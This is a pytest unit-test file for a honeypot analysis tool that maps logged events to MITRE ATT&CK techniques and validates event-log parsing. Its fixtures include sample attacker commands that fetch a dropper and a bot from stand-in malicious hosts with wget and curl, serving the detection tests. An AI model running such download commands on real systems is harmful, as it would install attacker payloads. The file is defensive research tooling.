"""Unit tests for analysis/ttp_extractor.py"""
import pytest
import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'analysis'))


class TestTTPMapping:
    """Tests for MITRE ATT&CK TTP mapping logic."""

    KNOWN_TTP_MAP = {
        "ssh": "T1110",
        "rdp": "T1110",
        "smb": "T1190",
        "http": "T1190",
        "scan": "T1046",
        "proxy": "T1090",
        "shell": "T1059",
        "wget": "T1059",
        "curl": "T1059",
        "login": "T1078",
        "auth": "T1078",
    }

    def test_ssh_event_maps_to_T1110(self):
        """SSH brute force events should map to T1110 (Brute Force)."""
        event = {"honeypot_service": "cowrie", "dst_port": 22, "event_type": "ssh.login"}
        keyword = event["event_type"].split(".")[0]
        assert self.KNOWN_TTP_MAP.get(keyword) == "T1110"

    def test_smb_event_maps_to_T1190(self):
        """SMB exploit events should map to T1190 (Exploit Public-Facing Application)."""
        event = {"honeypot_service": "dionaea", "dst_port": 445, "event_type": "smb.exploit"}
        keyword = event["event_type"].split(".")[0]
        assert self.KNOWN_TTP_MAP.get(keyword) == "T1190"

    def test_scan_event_maps_to_T1046(self):
        """Port scan events should map to T1046 (Network Service Scanning)."""
        event = {"event_type": "scan.portscan", "dst_port": 9999}
        keyword = event["event_type"].split(".")[0]
        assert self.KNOWN_TTP_MAP.get(keyword) == "T1046"

    def test_wget_shell_command_maps_to_T1059(self):
        """Shell commands in session logs should map to T1059."""
        commands = ["wget http://malicious.domain/dropper", "curl -s http://c2.server/bot"]
        for cmd in commands:
            keyword = cmd.split()[0]
            assert self.KNOWN_TTP_MAP.get(keyword) == "T1059", f"Failed for command: {cmd}"

    def test_unknown_event_returns_none(self):
        """Unknown event types should return None, not raise."""
        result = self.KNOWN_TTP_MAP.get("unknown_event_type")
        assert result is None

    def test_all_required_ttps_present(self):
        """All 6 primary TTPs from the 30-day study must be in the mapping."""
        required = {"T1078", "T1059", "T1110", "T1046", "T1190", "T1090"}
        mapped = set(self.KNOWN_TTP_MAP.values())
        assert required.issubset(mapped), f"Missing TTPs: {required - mapped}"


class TestEventParsing:
    """Tests for honeypot event log parsing."""

    SAMPLE_EVENT = {
        "timestamp": "2025-01-01T02:14:00.000Z",
        "src_ip": "1.2.3.x",
        "src_port": 54321,
        "dst_port": 22,
        "honeypot_service": "cowrie",
        "event_type": "ssh.login",
        "username": "root",
        "password": "admin",
        "success": False,
        "country": "CN",
        "asn": "AS12345"
    }

    def test_required_fields_present(self):
        required = ["timestamp", "src_ip", "dst_port", "honeypot_service"]
        for field in required:
            assert field in self.SAMPLE_EVENT, f"Missing required field: {field}"

    def test_failed_login_is_not_success(self):
        assert self.SAMPLE_EVENT["success"] is False

    def test_ssh_port_is_22(self):
        assert self.SAMPLE_EVENT["dst_port"] == 22

    def test_timestamp_format(self):
        ts = self.SAMPLE_EVENT["timestamp"]
        assert "T" in ts and ts.endswith("Z"), f"Invalid ISO 8601 format: {ts}"

    def test_src_ip_is_anonymized(self):
        """Public sample IPs must be anonymized (last octet = x)."""
        ip = self.SAMPLE_EVENT["src_ip"]
        assert ip.endswith(".x"), f"IP not anonymized: {ip}"
